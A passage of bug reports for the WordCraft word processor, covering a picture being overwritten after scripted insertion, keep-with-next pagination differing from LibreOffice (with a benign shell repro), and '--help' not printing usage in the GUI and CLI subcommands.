## Expected

A picture inserted by a command survives the next `text.newParagraph` or `text.insert`. A script has no way to see that the picture is selected.

## Suggestion

Leave the caret after the picture when `insert.picture` runs from a command (CLI, MCP, control channel), so the next typing command does not replace it. In the GUI, keep selecting the new picture, which is what users expect.

```sh
args=(--cmd 'tools.autocorrect={"enabled":false}')
for i in $(seq 1 25); do args+=(--cmd "text.insert={\"text\":\"filler $i\"}" --cmd text.newParagraph); done
args+=(--cmd para.keepNext --cmd 'text.insert={"text":"HEADING"}' --cmd text.newParagraph)
args+=(--cmd para.keepNext --cmd "text.insert={\"text\":\"BODYSTART $LONG\"}")
wordcraft-cli run --template blank "${args[@]}" --save c.docx
wordcraft-cli convert c.docx c.pdf
pdftotext c.pdf - | awk 'BEGIN{p=1}/\f/{p++}/HEADING|BODYSTART/{print "p"p": "$0}'
```

Output: `HEADING` on page 1, `BODYSTART` on page 2. The second `para.keepNext` toggles keep with next off again for the body paragraph; `c.docx` has `<w:keepNext/>` on the heading only.

What we measured:

- 24 filler lines: the body starts on page 1 with the heading, which is correct.
- 25 filler lines with a one-line body: the heading and body stay together on page 1, which is also correct.
- 25 filler lines with a long body: the heading is left alone on page 1.

We found this in a real 17-page document: the heading "Pendahuluan", followed by an empty kept paragraph and a long body paragraph, ends page 1 in WordCraft's PDF and starts page 2 in LibreOffice's.

## Related

#933 (merged after 0.5.0) changes keep with next for a kept paragraph that does not fit on the page. This case is different: the kept heading fits, the next paragraph does not. We have not tested it against `main`.

title: `--help` on the GUI binary and on CLI subcommands is treated as a file or rejected
author: Nael-Nathanael
body:
## Summary

Only `wordcraft-cli --help` prints usage. Elsewhere `--help` is opened as a file or rejected.

## Repro (WordCraft 0.5.0, `e4b7d155`, Linux)

```
$ wordcraft --help
WARN  [main] wordcraft: --help: --help: No such file or directory (os error 2)
```

The app then starts with a blank document.

```
$ wordcraft-cli commands --help
wordcraft-cli: commands: unknown option --help
```

Every subcommand we tried does the same: `run`, `text`, `info`, `inspect`, `convert`, `render`, `parity`, `mcp`. `-h` gives no error, but no help either: `wordcraft -h` tries to open a file named `-h`, `commands -h` prints the plain command list, and `run -h` prints nothing and exits 0.

## Expected

- `wordcraft --help` (and `-h`) prints the app's options, such as `--sample` and `--control`, and exits without opening a window.
- `wordcraft-cli <subcommand> --help` (and `-h`) prints usage instead of an error.
